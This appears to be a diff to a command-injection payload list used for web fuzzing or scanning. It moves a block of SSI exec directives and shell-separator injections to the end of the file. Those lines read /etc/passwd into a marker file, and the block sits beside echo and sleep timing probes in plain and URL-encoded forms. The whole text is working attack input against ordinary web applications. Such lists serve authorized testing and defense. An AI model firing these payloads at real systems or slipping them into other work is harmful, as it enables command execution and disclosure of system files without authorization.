@@ -22,19 +22,6 @@ echo gaw4f4sdaf12f
 `echo gaw4f4sdaf12f`
 %60echo gaw4f4sdaf12f%60
 %2560echo gaw4f4sdaf12f%2560
-<!--#exec cmd="echo gaw4f4sdaf12f" -->
-<!--#exec cmd="sleep 10" -->
-;$(cat /etc/passwd) > gaw4f4sdaf12f.txt
-|$(cat /etc/passwd) > gaw4f4sdaf12f.txt
-||$(cat /etc/passwd) > gaw4f4sdaf12f.txt
-&$(cat /etc/passwd) > gaw4f4sdaf12f.txt
-&&$(cat /etc/passwd) > gaw4f4sdaf12f.txt
-;cat /etc/passwd > gaw4f4sdaf12f.txt
-|cat /etc/passwd > gaw4f4sdaf12f.txt
-||cat /etc/passwd > gaw4f4sdaf12f.txt
-&cat /etc/passwd > gaw4f4sdaf12f.txt
-&&cat /etc/passwd > gaw4f4sdaf12f.txt
-`cat /etc/passwd > gaw4f4sdaf12f.txt`
 ;sleep 10
 %3Bsleep 10
 %253Bsleep 10
@@ -53,3 +40,16 @@ echo gaw4f4sdaf12f
 `sleep 10`
 %60sleep 10%60
 %2560sleep 10%2560
+<!--#exec cmd="echo gaw4f4sdaf12f" -->
+<!--#exec cmd="sleep 10" -->
+;$(cat /etc/passwd) > gaw4f4sdaf12f.txt
+|$(cat /etc/passwd) > gaw4f4sdaf12f.txt
+||$(cat /etc/passwd) > gaw4f4sdaf12f.txt
+&$(cat /etc/passwd) > gaw4f4sdaf12f.txt
+&&$(cat /etc/passwd) > gaw4f4sdaf12f.txt
+;cat /etc/passwd > gaw4f4sdaf12f.txt
+|cat /etc/passwd > gaw4f4sdaf12f.txt
+||cat /etc/passwd > gaw4f4sdaf12f.txt
+&cat /etc/passwd > gaw4f4sdaf12f.txt
+&&cat /etc/passwd > gaw4f4sdaf12f.txt
+`cat /etc/passwd > gaw4f4sdaf12f.txt`
